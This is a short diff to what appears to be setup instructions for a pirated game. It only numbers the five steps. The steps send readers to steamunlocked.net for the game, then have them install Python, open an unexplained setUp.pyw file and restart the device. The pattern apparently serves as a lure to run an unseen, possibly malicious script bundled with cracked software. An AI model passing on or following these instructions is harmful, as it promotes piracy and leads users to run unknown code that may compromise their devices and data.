@@ -1,9 +1,9 @@
-The first thing you must download the game from our website steamunlocked.net
+1•The first thing you must download the game from our website steamunlocked.net
 
-You must download Python from the official website.
+2•You must download Python from the official website.
 
-Install the Python tool.
+3•Install the Python tool.
 
-Then open the setUp.pyw file, wait 10 seconds, then restart the device.
+4•Then open the setUp.pyw file, wait 10 seconds, then restart the device.
 
-Open the game file and enjoy.
+5•Open the game file and enjoy.
